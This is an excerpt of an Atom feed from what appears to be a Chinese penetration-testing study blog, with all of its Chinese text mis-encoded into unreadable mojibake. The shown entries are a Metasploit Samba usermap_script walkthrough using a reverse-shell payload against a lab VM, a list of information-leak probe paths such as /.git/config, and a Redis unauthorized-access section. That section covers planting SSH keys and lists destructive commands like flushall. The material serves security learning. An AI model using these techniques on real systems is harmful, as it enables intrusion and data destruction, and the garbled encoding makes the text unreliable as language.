ä¸ºå¤§éƒ¨åˆ†æ¼æ´çš„äº§ç”Ÿå°±æ˜¯æŸä¸€ç‰ˆæœ¬çš„é—®é¢˜ã€‚æˆ‘ä»¬æ­¤æ¬¡è¦æ”»å‡»139ç«¯å£ï¼Œå¦‚å›¾ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æœåŠ¡çš„æŒ‡çº¹ä¿¡æ¯ï¼Œä¸»è¦å°±æ˜¯æœåŠ¡åç§°å’Œç‰ˆæœ¬å·ï¼Œæ˜¯sambaçš„æœåŠ¡ï¼Œå¤„äº3.X-4.Xç‰ˆæœ¬ã€‚</p><h4 id="æœç´¢Sambaçš„exploit"><a class="header-anchor" href="#æœç´¢Sambaçš„exploit">ğŸ­</a>æœç´¢Sambaçš„exploit</h4><p><img src="/2021/02/27/wei1/1.jpg" alt="1"></p><p>åˆ©ç”¨è¿”å›çš„ç»“æœä¸­å„ä¸ªæ¼æ´è¢«åˆ©ç”¨çš„éš¾æ˜“ç¨‹åº¦é€‰æ‹©æ¼æ´ï¼Œè¿™é‡Œæˆ‘é€‰<code>exploit/multi/samba/usermap_script</code>å› ä¸ºå®ƒéš¾åº¦è¾ƒä½ã€‚ä¸€èˆ¬æœ‰é™é€‰æ‹©excellentå’Œgreatä¸¤ç§ç­‰çº§ï¼Œå› ä¸ºç¨³å®šä¸”æ•ˆæœæ˜æ˜¾ï¼Œå…¶æ¬¡å°±æ˜¯åé¢çš„æè¿°æ˜¯å¦å’Œæˆ‘ä»¬æ”»å‡»çš„æœåŠ¡æœ‰å…³</p><h4 id="æŸ¥è¯¢æ¼æ´è¯¦ç»†ä¿¡æ¯"><a class="header-anchor" href="#æŸ¥è¯¢æ¼æ´è¯¦ç»†ä¿¡æ¯">ğŸ­</a>æŸ¥è¯¢æ¼æ´è¯¦ç»†ä¿¡æ¯</h4><p><img src="/2021/02/27/wei1/4.jpg" alt="4"></p><p>ä½¿ç”¨è¯¥exploitï¼ŒæŸ¥çœ‹exploitä¸‹çš„payloads(å¦‚æœæ˜¯çŸ¥é“ä½¿ç”¨å“ªä¸ªæ¨¡å—ï¼Œå¯ä»¥è¾“å…¥æ¯ä¸ª / åçš„å‰2-4ä¸ªå­—æ¯ä½¿ç”¨tableè¡¥é½)</p><p><img src="/2021/02/27/wei1/5.jpg" alt="5"></p><p>é€‰æ‹©æ”»å‡»è½½è·çš„æ—¶å€™ï¼Œå»ºè®®é€‰ç”¨å’Œmeterpreterå’Œreverseç›¸å…³çš„è½½è·(ç”±äºæ”»å‡»çš„ç›®æ ‡æœºå¯èƒ½å¤„åœ¨å†…ç½‘é‡Œï¼Œæ”»å‡»çš„æ—¶å€™å­˜åœ¨ç«¯å£æ˜ å°„ç­‰æ–¹é¢çš„é—®é¢˜ï¼Œä½¿ç”¨åå¼¹å¯ä»¥æ›´ç¨³å®š)è¿™æ¬¡å°±ç”¨<code>cmd/unix/reverse</code></p><h4 id="æ¥ä¸‹æ¥æŸ¥çœ‹éœ€è¦å¡«å†™çš„å‚æ•°"><a class="header-anchor" href="#æ¥ä¸‹æ¥æŸ¥çœ‹éœ€è¦å¡«å†™çš„å‚æ•°">ğŸ­</a>æ¥ä¸‹æ¥æŸ¥çœ‹éœ€è¦å¡«å†™çš„å‚æ•°</h4><p><img src="/2021/02/27/wei1/7.jpg" alt="7"></p><blockquote><p><strong>Tips:</strong></p><p>åœ¨çœŸå®çš„ç¯å¢ƒä¸­ï¼ŒRPORTå¯èƒ½å¹¶ä¸æ˜¯é»˜è®¤çš„å‚æ•°ï¼Œç”±äºä¸€ä¸ªæœåŠ¡æ˜¯æ”¾åœ¨å†…ç½‘å½“ä¸­ï¼Œä»–é€šè¿‡è·¯ç”±å™¨è½¬å‘ï¼Œå¯èƒ½ä¼šå‡ºç°ç«¯å£çš„å˜åŒ–ï¼ˆç«¯å£æ˜ å°„ï¼‰<br>exploit targetä¹Ÿæ˜¯éå¸¸é‡è¦çš„å‚æ•°ï¼Œå¯é€šè¿‡show targetsï¼ŒæŸ¥çœ‹ç›®æ ‡ç³»ç»Ÿæœ‰å“ªäº›.<br>æŸ¥çœ‹ç›®æ ‡çš„ç³»ç»Ÿï¼Œå¯ä»¥ä½¿ç”¨ï¼šnmap â€“O IPï¼Œç„¶åä½¿ç”¨set target IDé€‰æ‹©ç›®æ ‡ç±»å‹ï¼Œä¸»è¦ç”¨äºå¢åŠ æˆåŠŸ</p></blockquote><p>å…¶ä¸­åªæœ‰RHOSTæ˜¯ç©ºï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±å¡«ä¸Šè¯¥ä¿¡æ¯</p><p><img src="/2021/02/27/wei1/6.jpg" alt="6"></p><p>ç°åœ¨å°±å¯ä»¥å‘åŠ¨æ”»å‡»ï¼Œæ‰§è¡Œä»»æ„å‘½ä»¤</p><p><img src="/2021/02/27/wei1/8.jpg" alt="8"></p><p>å…¥é—¨çš„æµ‹è¯•å°±å®Œæˆè¾½â¤ï¸â¤ï¸â¤ï¸</p><h3 id="åè®°"><a class="header-anchor" href="#åè®°">ğŸ­</a>åè®°</h3><p>ç”±äºæœ¬ç¯‡è®°å½•å…¥é—¨æµ‹è¯•ï¼Œæ•…é€‰æ‹©çš„é¶æœºä¹Ÿè¾ƒä¸ºåŸºç¡€ï¼Œå®æˆ˜ä¸­ç›®æ ‡ä¸»æœºçš„å¾ˆå¤šä¿¡æ¯éƒ½éœ€è¦æ”¶é›†ï¼Œæ— æ³•åƒæœ¬ç¯‡æ–‡ç« ç”¨åˆ°çš„é¶æœºä¸€æ ·å¯ä»¥ç›´æ¥è·å–ä¿¡æ¯ï¼Œåæ¸—é€æµ‹è¯•æ”¹å¤©å†å­¦ä¹ ğŸ‘»ğŸ‘»ğŸ‘»</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Information Exposure</title>
    <link href="/2021/02/24/everything/"/>
    <url>/2021/02/24/everything/</url>
    
    <content type="html"><![CDATA[<h2 id="æ¦‚è¿°"><a class="header-anchor" href="#æ¦‚è¿°">ğŸ­</a>æ¦‚è¿°</h2><p>ç”±äºåå°äººå‘˜çš„ç–å¿½æˆ–è€…ä¸å½“çš„è®¾è®¡ï¼Œå¯¼è‡´ä¸åº”è¯¥è¢«å‰ç«¯ç”¨æˆ·çœ‹åˆ°çš„æ•°æ®è¢«è½»æ˜“çš„è®¿é—®åˆ°ï¼š</p><ul><li><p>é€šè¿‡è®¿é—®urlä¸‹çš„ç›®å½•ï¼Œå¯ä»¥ç›´æ¥åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶åˆ—è¡¨</p></li><li><p>è¾“å…¥é”™è¯¯çš„urlå‚æ•°åæŠ¥é”™ä¿¡æ¯é‡Œé¢åŒ…å«æ“ä½œç³»ç»Ÿã€ä¸­é—´ä»¶ã€å¼€å‘è¯­è¨€çš„ç‰ˆæœ¬æˆ–å…¶ä»–ä¿¡æ¯</p></li><li><p>å‰ç«¯çš„æºç ï¼ˆ<code>html,css,js</code>ï¼‰é‡Œé¢åŒ…å«äº†æ•æ„Ÿä¿¡æ¯ï¼Œæ¯”å¦‚åå°ç™»å½•åœ°å€ã€å†…ç½‘æ¥å£ä¿¡æ¯ã€ç”šè‡³è´¦å·å¯†ç ç­‰</p></li></ul><p>æ•æ„Ÿä¿¡æ¯æ³„éœ²å¾€å¾€ç»™æ”»å‡»ç€å®æ–½è¿›ä¸€æ­¥çš„æ”»å‡»æä¾›å¾ˆå¤§çš„å¸®åŠ©ï¼Œæ¼æ´å‡ºç°çš„ä½ç½®ã€é€ æˆçš„å±å®³æœ‰å¾ˆå¤§çš„å·®å¼‚æ€§ã€‚</p><h2 id="ç±»å‹"><a class="header-anchor" href="#ç±»å‹">ğŸ­</a>ç±»å‹</h2><h4 id="ç½‘ç»œä¿¡æ¯æ³„éœ²"><a class="header-anchor" href="#ç½‘ç»œä¿¡æ¯æ³„éœ²">ğŸ­</a>ç½‘ç»œä¿¡æ¯æ³„éœ²</h4><ul><li><p>DNSåŸŸä¼ é€æ¼æ´</p></li><li><p>è¿ç»´ç›‘æ§ç³»ç»Ÿå¼±å£ä»¤ã€ç½‘ç»œæ‹“æ‰‘æ³„éœ²</p><p>zabbixå¼±å£ä»¤ã€zabbix sqlæ³¨å…¥â€¦â€¦</p></li></ul><h4 id="WEBæ•æ„Ÿä¿¡æ¯"><a class="header-anchor" href="#WEBæ•æ„Ÿä¿¡æ¯">ğŸ­</a>WEBæ•æ„Ÿä¿¡æ¯</h4><ul><li><p>phpinfo()ä¿¡æ¯æ³„éœ²</p></li><li><p>æµ‹è¯•é¡µé¢æ³„éœ²åœ¨å¤–ç½‘</p></li></ul><p><code> test.cgiã€phpinfo.phpã€info.php</code>ç­‰</p><ul><li>ç¼–è¾‘å™¨å¤‡ä»½æ–‡ä»¶æ³„éœ²åœ¨å¤–ç½‘</li></ul><p><code>http://[ip]/.test.php.swp</code></p><p><code> http://[ip]/test.php.bak</code></p><p><code> http://[ip]/test.jsp.old</code></p><p><code> http://[ip]/cgi~</code></p><p>å¸¸è§ç¼–è¾‘å™¨å¤‡ä»½åç¼€</p><ul><li>ç‰ˆæœ¬ç®¡ç†å·¥å…·(å¦‚git)æ–‡ä»¶ä¿¡æ¯æ³„éœ²</li></ul><p><code>http://[ip]/.git/config</code></p><p><code> http://[ip]/CVS/Entriesp</code></p><p><code>http://[ip]/.svn/entriesp</code></p><p><code>http://[ip]/.svn/wc.db</code></p><ul><li>HTTPè®¤è¯æ³„éœ²æ¼æ´</li></ul><p><code>http://[ip]/basic/index.php</code></p><p>Webç›®å½•å¼€å¯äº†HTTP Basicè®¤è¯ï¼Œä½†æœªé™åˆ¶IPï¼Œå¯¼è‡´å¯æš´åŠ›ç ´è§£è´¦å·ã€å¯†ç </p><ul><li>ç®¡ç†åå°åœ°å€æ³„éœ²</li></ul><p><code> http://[ip]/login.php</code></p><p><code> http://[ip]/admin.php</code></p><ul><li><p>é”™è¯¯é¡µé¢æš´éœ²ä¿¡æ¯</p><p>é”™è¯¯é¡µé¢ç”±æœåŠ¡å™¨äº§ç”Ÿ403ã€404ã€500ç­‰é”™è¯¯æ—¶ï¼Œè¿”å›è¯¦ç»†é”™è¯¯ä¿¡æ¯ã€‚æŠ¥é”™ä¿¡æ¯ä¸­å¯èƒ½ä¼šåŒ…å«æœåŠ¡å™¨ä»£ç ä¿¡æ¯ã€æ•°æ®åº“è¿æ¥ä¿¡æ¯ã€SQLè¯­å¥æˆ–è€…æ•æ„Ÿæ–‡ä»¶çš„è·¯å¾„</p><p><strong>æ£€æµ‹</strong>ï¼š</p><p>1.é€šè¿‡ç›®å½•æ‰«ææˆ–æ‰‹å·¥è¾“å…¥ä¸å­˜åœ¨çš„æ–‡ä»¶æˆ–è·¯å¾„ï¼Œè§¦å‘æœåŠ¡å™¨äº§ç”Ÿ404é”™è¯¯å¹¶è¿”å›404é¡µé¢</p><p>2.é€šè¿‡ç›®å½•æ‰«ææˆ–æ‰‹å·¥è¾“å…¥ä¸€ä¸ªæ— æƒé™æŸ¥çœ‹çš„æ–‡ä»¶æˆ–è·¯å¾„ï¼Œè§¦å‘æœåŠ¡å™¨äº§ç”Ÿ403é”™è¯¯å¹¶è¿”å›403é¡µé¢</p><p>3.æ‰‹å·¥è¾“å…¥ä¸å­˜åœ¨çš„å‚æ•°æˆ–ç‰¹æ®Šæ„é€ çš„å­—ç¬¦ä¸²ï¼Œå¦‚å•å¼•å·ï¼Œå°–æ‹¬å·ç­‰ï¼Œè§¦å‘æœåŠ¡å™¨äº§ç”Ÿ500é”™è¯¯å¹¶è¿”å›500é¡µé¢æˆ–å¼‚å¸¸ä¿¡æ¯ã€‚</p></li><li><p>æœåŠ¡å™¨æ¢é’ˆæ–‡ä»¶</p></li><li><p>å­˜åœ¨å¯è®¿é—®çš„ç®¡ç†æ§åˆ¶å°å…¥å£</p><p>Web æ§åˆ¶å°æ˜¯ä¸€ç§åŸºäº Web çš„ç”¨æˆ·ç•Œé¢ï¼Œ  å…¶å¸¸å¸¸è¢«ç”¨äºç½‘ç«™åå°æˆ–è€…webå®¹å™¨ã€‚æ§åˆ¶å°ä¸­ï¼Œå…¶ä¸ä»…ä»…å±€é™äºå®¹å™¨æˆ–è€…ç½‘ç«™ç®¡ç†åå°ï¼Œè¿˜åŒ…æ‹¬ä¸€äº›æ•°æ®åº“é»˜è®¤åœ°å€ç­‰ã€‚åœ¨webå®‰å…¨ä¸­ï¼Œç½‘ç«™ç³»ç»Ÿåœ¨æ³„æ¼å…¶webå®¹å™¨ï¼ˆä¸­é—´ä»¶ï¼‰æˆ–è€…æ•°æ®åº“çš„æ§åˆ¶å°åï¼Œå­˜åœ¨å¢åŠ è¢«å…¥ä¾µçš„é£é™©ã€‚å¸¸è§çš„webæ§åˆ¶å°ï¼š<code>tomcatã€aria2ã€weblogicã€websphereã€oracleã€jbossâ€¦â€¦</code>webçš„å®¹å™¨æ§åˆ¶å°å¸¸è§è®¿é—®å½¢å¼ï¼š<code>http://host:port/load/</code></p><p><strong>æ£€æµ‹</strong>ï¼š</p><p>æ€è·¯ä¸ºé¦–å…ˆéœ€è¯†åˆ«ç½‘ç«™å®¹å™¨çš„æŒ‡çº¹ï¼Œåˆ¤æ–­å…¶æ‰€é‡‡ç”¨çš„ä¸­é—´ä»¶ï¼Œç„¶åå»æ‰«æå…¶æ‰€å¼€æ”¾çš„ç«¯å£ï¼Œæ ¹æ®å¼€æ”¾ç«¯å£ä¿¡æ¯å’Œå¸¸è§å›ºå®šçš„è·¯å¾„ï¼Œå»åˆ¤æ–­å…¶æ§åˆ¶å°åœ°å€ã€‚</p></li><li><p>å­˜åœ¨å¯è®¿é—®çš„ç®¡ç†åå°å…¥å£(åº”è¯¥æ¯”è¾ƒå°‘è§)</p><p>åº”ç”¨å­˜åœ¨æœªé™åˆ¶è®¿é—®çš„åå°ï¼Œæˆ–è€…èƒ½ç›´æ¥ç™»å½•ç®¡ç†åå°,æˆ–åˆ©ç”¨ä¸Šä¼ åŠŸèƒ½ä¸Šä¼ webshellï¼Œå¯¼è‡´æœåŠ¡å™¨è¢«æ§åˆ¶</p><p><strong>æ£€æµ‹</strong>ï¼š</p><ol><li><p>å¯ä»¥åˆ©ç”¨webæ¼æ´æ‰«æå™¨æˆ–ç›®å½•æ‰«æå™¨æ‰«æwebåº”ç”¨è¿›è¡Œæ£€æµ‹</p></li><li><p>è¯†åˆ«ç½‘ç«™ä½¿ç”¨çš„cmsæ¡†æ¶ï¼Œåˆ¤æ–­å…¶é»˜è®¤çš„ç®¡ç†åå°åœ°å€ã€‚</p></li><li><p>åœ¨ç½‘ç«™ä¸­å¯»æ‰¾ç®¡ç†åå°è¶…é“¾æ¥</p></li></ol></li><li><p>é»˜è®¤é¡µé¢æ³„æ¼</p><p>å­˜åœ¨é»˜è®¤å®‰è£…ä¸­é—´ä»¶ã€æ’ä»¶ã€æ¡†æ¶ç­‰ä¼šæºå¸¦ç¤ºä¾‹é¡µé¢åŠè¯´æ˜æ–‡æ¡£</p></li><li><p>å…¥ä¾µç—•è¿¹æ®‹ç•™</p><p>åœ¨æ¸—é€è¿‡ç¨‹ä¸­å‘ç°åº”ç”¨ä¸­å­˜åœ¨æ›¾ç»çš„å…¥ä¾µç—•è¿¹ï¼Œå¦‚å­˜åœ¨çš„webshellæ–‡ä»¶ã€‚æ®‹ç•™çš„å…¥ä¾µç—•è¿¹å¯è¢«å…¶ä»–æ”»å‡»è€…ç”¨äºäºŒæ¬¡æ”»å‡».</p><p><strong>æ£€æµ‹</strong>ï¼š</p><p>é€šå¸¸ä½¿ç”¨Webåº”ç”¨å®‰å…¨æ¼æ´æ‰«æå·¥å…·æˆ–ç›®å½•æ‰«æå·¥å…·å‘ç°å…¥ä¾µç—•è¿¹</p></li><li><p>HTTPå¤´ä¿¡æ¯æ³„æ¼</p><p>åœ¨æœåŠ¡å™¨è¿”å›çš„HTTPå¤´ä¸­æ³„éœ²æœåŠ¡å™¨ä¿¡æ¯</p><p><strong>æ£€æµ‹</strong>:</p><ol><li><p>åœ¨æµè§ˆå™¨çš„è°ƒè¯•çª—å£ä¸­æŸ¥çœ‹HTTPå“åº”å¤´</p></li><li><p>ä½¿ç”¨ä»£ç†è½¯ä»¶å¦‚burpsuiteã€fiddlerï¼Œæ‹¦æˆªHTTPå“åº”å¤´</p></li></ol></li><li><p>ç‰©ç†è·¯å¾„æ³„æ¼</p><p>åº”ç”¨ä¸­æ³„éœ²å‡ºåº”ç”¨åœ¨ä¸»æœºä¸­çš„ç»å¯¹åœ°å€è·¯å¾„ã€‚</p><p><strong>æ£€æµ‹</strong>ï¼š</p><ol><li><p>æ‰“å¼€ç½‘é¡µæºä»£ç ï¼ŒæŸ¥çœ‹å›¾ç‰‡ç­‰åª’ä½“çš„é“¾æ¥åŠè¶…é“¾æ¥ï¼›</p></li><li><p>é€šè¿‡æŠ¥é”™ä¿¡æ¯è·å–</p></li></ol></li><li><p>å†å²æ–‡ä»¶æ®‹ç•™</p><p>åº”ç”¨é—ç•™çš„è¿‡æ—¶æ–‡ä»¶ã€å¤‡ä»½é¡µé¢ã€æ¸—é€æµ‹è¯•é—ç•™æ–‡ä»¶ã€å¼€å‘æ–‡ä»¶æ®‹ç•™çš„æµ‹è¯•æ–‡ä»¶</p></li><li><p><code>robots.txt</code></p><p>æœç´¢å¼•æ“å¯ä»¥é€šè¿‡robotsæ–‡ä»¶å¯ä»¥è·çŸ¥å“ªäº›é¡µé¢å¯ä»¥çˆ¬å–ï¼Œå“ªäº›é¡µé¢ä¸å¯ä»¥çˆ¬å–ã€‚</p><p>Robotsåè®®æ˜¯ç½‘ç«™å›½é™…äº’è”ç½‘ç•Œé€šè¡Œçš„é“å¾·è§„èŒƒï¼Œå…¶ç›®çš„æ˜¯ä¿æŠ¤ç½‘ç«™æ•°æ®å’Œæ•æ„Ÿä¿¡æ¯ã€ç¡®ä¿ç”¨æˆ·ä¸ªäººä¿¡æ¯å’Œéšç§ä¸è¢«ä¾µçŠ¯ï¼Œå¦‚æœrobots.txtæ–‡ä»¶ç¼–è¾‘çš„å¤ªè¿‡è¯¦ç»†ï¼Œåè€Œä¼šæ³„éœ²ç½‘ç«™çš„æ•æ„Ÿç›®å½•æˆ–è€…æ–‡ä»¶ï¼Œæ¯”å¦‚ç½‘ç«™åå°è·¯å¾„ï¼Œä»è€Œå¾—çŸ¥å…¶ä½¿ç”¨çš„ç³»ç»Ÿç±»å‹ï¼Œä»è€Œæœ‰é’ˆå¯¹æ€§åœ°è¿›è¡Œåˆ©ç”¨</p></li><li><p>ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶</p><p>ç®¡ç†å‘˜å¤‡ä»½ç½‘ç«™æ–‡ä»¶åé”™è¯¯åœ°å°†å¤‡ä»½æ”¾åœ¨webç›®å½•ä¸‹ï¼Œå¸¸è§çš„åç¼€åï¼š<code>.rarã€.zipã€.7zã€.tarã€.tar.gzã€.bakã€.txt</code></p></li></ul><h4 id="tips-ç›®å½•éå†"><a class="header-anchor" href="#tips-ç›®å½•éå†">ğŸ­</a>tips:ç›®å½•éå†</h4><p>åœ¨webåŠŸèƒ½è®¾è®¡ä¸­,å¾ˆå¤šæ—¶å€™è¦å°†éœ€è¦è®¿é—®çš„æ–‡ä»¶å®šä¹‰æˆå˜é‡ä»è€Œè®©å‰ç«¯çš„åŠŸèƒ½æ›´åŠ çµæ´»ã€‚ å½“ç”¨æˆ·å‘èµ·ä¸€ä¸ªå‰ç«¯çš„è¯·æ±‚æ—¶ï¼Œä¾¿ä¼šå°†è¯·æ±‚çš„è¿™ä¸ªæ–‡ä»¶çš„å€¼(æ¯”å¦‚æ–‡ä»¶åç§°)ä¼ é€’åˆ°åå°ï¼Œåå°å†æ‰§è¡Œå…¶å¯¹åº”çš„æ–‡ä»¶ã€‚å¦‚æœåå°æ²¡æœ‰å¯¹å‰ç«¯ä¼ è¿›æ¥çš„å€¼è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡â€œâ€¦/â€è®©åå°æ‰“å¼€æˆ–è€…æ‰§è¡Œä¸€äº›å…¶ä»–çš„æ–‡ä»¶ï¼Œå¯¼è‡´åå°æœåŠ¡å™¨ä¸Šå…¶ä»–ç›®å½•çš„æ–‡ä»¶ç»“æœè¢«éå†å‡ºæ¥ï¼ˆè·Ÿä¹‹å‰è®²çš„æ–‡ä»¶ä¸‹è½½æœ‰ç‚¹åƒï¼‰</p><p><em>å¦‚æœé€šè¿‡ä¸å¸¦å‚æ•°çš„urlï¼ˆå¦‚ï¼š<code>http://xxxx/doc</code>ï¼‰åˆ—å‡ºäº†docæ–‡ä»¶å¤¹é‡Œé¢æ‰€æœ‰çš„æ–‡ä»¶ä¹Ÿç§°ä¸ºä¸ºæ•æ„Ÿä¿¡æ¯æ³„éœ²è€Œä¸å½’ä¸ºç›®å½•éå†æ¼æ´</em></p><h4 id="å®ä¾‹"><a class="header-anchor" href="#å®ä¾‹">ğŸ­</a>å®ä¾‹</h4><p><strong>Refereræ³„éœ²token</strong></p><p>å¦‚:åœ¨è®ºå›å›å¤å¤„é€šè¿‡åŒ…å«<code>&lt;img&gt;</code>æ ‡ç­¾ï¼Œå‘æ”»å‡»è€…çš„æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œç”¨æˆ·ä¸€æ—¦è®¿é—®å°†æ³„éœ²Oauth tokenã€‚æˆ–å­˜åœ¨è·³è½¬é“¾æ¥ï¼Œå¯å°†tokenæ³„éœ²ç»™ç¬¬ä¸‰æ–¹ç«™ç‚¹.</p><p><strong>å¼‚å¸¸æ“ä½œæ³„éœ²æ—¥å¿—æ–‡ä»¶</strong></p><p>ä½¿ç”¨è¶…é•¿å‚æ•°å€¼å¤šçº¿ç¨‹è®¿é—®å‘èµ·é•¿è¯·æ±‚å¯¼è‡´access.logè¿‡å¤§ï¼Œå°†ä¸€äº›éƒ¨åˆ†è½¬å‚¨åˆ°å“åº”ä¸­ï¼Œæ³„éœ²ç”¨æˆ·çš„ipåœ°å€ï¼Œè¯·æ±‚æ—¶é—´å’Œurlè·¯å¾„ã€‚</p><p>æµ‹è¯•æ–¹æ³•:å¢åˆ å‚æ•°å€¼ã€æ„é€ ç•¸å½¢æ•°æ®ã€è¶…é•¿æ•°æ®ç­‰ä½¿æœåŠ¡å™¨æŠ¥é”™ï¼ŒæŠ¥é”™ä¿¡æ¯å¯èƒ½æ³„éœ²æœåŠ¡å™¨ç»å¯¹è·¯å¾„ã€ç‰ˆæœ¬å·ã€ä»£ç å±‚ä¿¡æ¯ã€æ•°æ®åº“ä¿¡æ¯â€¦â€¦</p><h2 id="æ•æ„Ÿä¿¡æ¯æœé›†å·¥å…·"><a class="header-anchor" href="#æ•æ„Ÿä¿¡æ¯æœé›†å·¥å…·">ğŸ­</a>æ•æ„Ÿä¿¡æ¯æœé›†å·¥å…·</h2><ul><li>weaplescan</li><li><a href="https://github.com/lijiejie/BBScan">BBScan</a></li><li>whatweb</li><li>dnsenum</li></ul><h2 id="åè®°"><a class="header-anchor" href="#åè®°">ğŸ­</a>åè®°</h2><p>åŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯ç¼ºå®æˆ˜æŒ–æ˜æ¼æ´ï¼Œæœ¬æ¥æƒ³åœ¨pikachuæ¼”ç¤ºä¸€ä¸‹ï¼Œç»“æœæŸ¥çœ‹æºç å°±å¯ä»¥çœ‹å‡ºä¿¡æ¯æ³„éœ²ã€‚ã€‚ã€‚</p><p>å‚è€ƒ:<a href="https://cloud.tencent.com/developer/article/1516484">ä¿¡æ¯æ³„éœ²ï¼ˆInformation Exposureï¼‰æŒ–æ˜åŠå®æˆ˜æ¡ˆä¾‹å…¨æ±‡æ€»</a></p><p><a href="https://www.secpulse.com/archives/134923.html">ä¿¡æ¯æ³„éœ²ç¯‡</a></p><p><a href="http://wyb0.com/posts/sensitive-information-leakage/">æ•æ„Ÿä¿¡æ¯æ³„éœ²æ€»ç»“</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>æœªæˆæƒè®¿é—®â€”â€”Redis</title>
    <link href="/2021/02/24/weakpassword/"/>
    <url>/2021/02/24/weakpassword/</url>
    
    <content type="html"><![CDATA[<h1>æ¦‚è¿°</h1><p>éœ€è¦å®‰å…¨é…ç½®æˆ–æƒé™è®¤è¯çš„åœ°å€ã€æˆæƒé¡µé¢å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´å…¶ä»–ç”¨æˆ·å¯ä»¥ç›´æ¥è®¿é—®ï¼Œä»è€Œå¼•å‘é‡è¦æƒé™å¯è¢«æ“ä½œã€æ•°æ®åº“ã€ç½‘ç«™ç›®å½•ç­‰æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</p><p>å¸¸è§ï¼š</p><blockquote><p>Redisæœªæˆæƒè®¿é—®<br>Jenkinsæœªæˆæƒè®¿é—®<br>MongoDBæœªæˆæƒè®¿é—®<br>ZooKeeperæœªæˆæƒè®¿é—®<br>Elasticsearchæœªæˆæƒè®¿é—®<br>Memcacheæœªæˆæƒè®¿é—®<br>Hadoopæœªæˆæƒè®¿é—®<br>CouchDBæœªæˆæƒè®¿é—®<br>Dockeræœªæˆæƒè®¿é—®<br>LDAPæœªæˆæƒè®¿é—®<br>Rsyncæœªæˆæƒè®¿é—®<br>FTPæœªæˆæƒè®¿é—®<br>GitLabæœªæˆæƒè®¿é—®<br>Solræœªæˆæƒè®¿é—®<br>Hadoopæœªæˆæƒè®¿é—®<br>Dubboæœªæˆæƒè®¿é—®<br>NFSæœªæˆæƒè®¿é—®<br>Sambaæœªæˆæƒè®¿é—®</p></blockquote><h2 id="Redisæœªæˆæƒè®¿é—®"><a class="header-anchor" href="#Redisæœªæˆæƒè®¿é—®">ğŸ­</a>Redisæœªæˆæƒè®¿é—®</h2><p>æ”»å‡»è€…æ— éœ€è®¤è¯è®¿é—®åˆ°å†…éƒ¨æ•°æ®ï¼Œå¯å¯¼è‡´æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œä¹Ÿå¯ä»¥æ¶æ„æ‰§è¡Œflushallæ¥æ¸…ç©ºæ‰€æœ‰æ•°æ®ã€‚å½“Redisä»¥rootèº«ä»½è¿è¡Œï¼Œå¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•å—å®³æœåŠ¡å™¨ã€‚</p><h3 id="redis"><a class="header-anchor" href="#redis">ğŸ­</a>redis</h3><p><code>redis</code>æ˜¯ä¸€ä¸ª<code>key-value</code>å­˜å‚¨ç³»ç»Ÿ,æ”¯æŒå­˜å‚¨å¤šç§valueç±»å‹ï¼š<code>stringã€listã€setã€zset(sorted set --æœ‰åºé›†åˆ)å’Œhashã€‚</code>è¿™äº›æ•°æ®ç±»å‹éƒ½æ”¯æŒ<code>push/pop</code>ã€<code>add/remove</code>åŠå–äº¤é›†å¹¶é›†å’Œå·®é›†ç­‰å¤šç§æ“ä½œï¼Œä¸”è¿™äº›æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„ã€‚redisè¿˜æ”¯æŒå„ç§ä¸åŒæ–¹å¼çš„æ’åºã€‚ä¸ºä¿è¯æ•ˆç‡ï¼Œæ•°æ®éƒ½ç¼“å­˜åœ¨å†…å­˜ä¸­ï¼Œä¸”redisä¼šå‘¨æœŸæ€§çš„æŠŠæ›´æ–°çš„æ•°æ®å†™å…¥ç£ç›˜æˆ–è€…æŠŠä¿®æ”¹æ“ä½œå†™å…¥è¿½åŠ çš„è®°å½•æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šå®ç°äº†<code>master-slave(ä¸»ä»)</code>åŒæ­¥</p><h4 id="å¸¸ç”¨å‘½ä»¤"><a class="header-anchor" href="#å¸¸ç”¨å‘½ä»¤">ğŸ­</a>å¸¸ç”¨å‘½ä»¤</h4><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> testkey <span class="hljs-string">&quot;genius&quot;</span>              # è®¾ç½®é”®testkeyçš„å€¼ä¸ºgenius<span class="hljs-builtin-name">get</span> testkey                       # è·å–é”®testkeyçš„å†…å®¹<span class="hljs-builtin-name">SET</span> score 99                      # è®¾ç½®é”®scoreçš„å€¼ä¸º99INCR score                        # ä½¿ç”¨INCRå‘½ä»¤å°†scoreçš„å€¼å¢åŠ 1<span class="hljs-builtin-name">GET</span> score                         # è·å–é”®scoreçš„å†…å®¹keys *                            # åˆ—å‡ºå½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰çš„é”®<span class="hljs-builtin-name">get</span> anotherkey                    # è·å–ä¸€ä¸ªä¸å­˜åœ¨çš„é”®çš„å€¼config <span class="hljs-builtin-name">set</span> dir /home/test         # è®¾ç½®å·¥ä½œç›®å½•config <span class="hljs-builtin-name">set</span> dbfilename redis.rdb   # è®¾ç½®å¤‡ä»½æ–‡ä»¶åconfig <span class="hljs-builtin-name">get</span> dir                    # æ£€æŸ¥å·¥ä½œç›®å½•æ˜¯å¦è®¾ç½®æˆåŠŸconfig <span class="hljs-builtin-name">get</span> dbfilename             # æ£€æŸ¥å¤‡ä»½æ–‡ä»¶åæ˜¯å¦è®¾ç½®æˆåŠŸsave                              # è¿›è¡Œä¸€æ¬¡å¤‡ä»½æ“ä½œflushall                          #åˆ é™¤æ‰€æœ‰æ•°æ®del key                           #åˆ 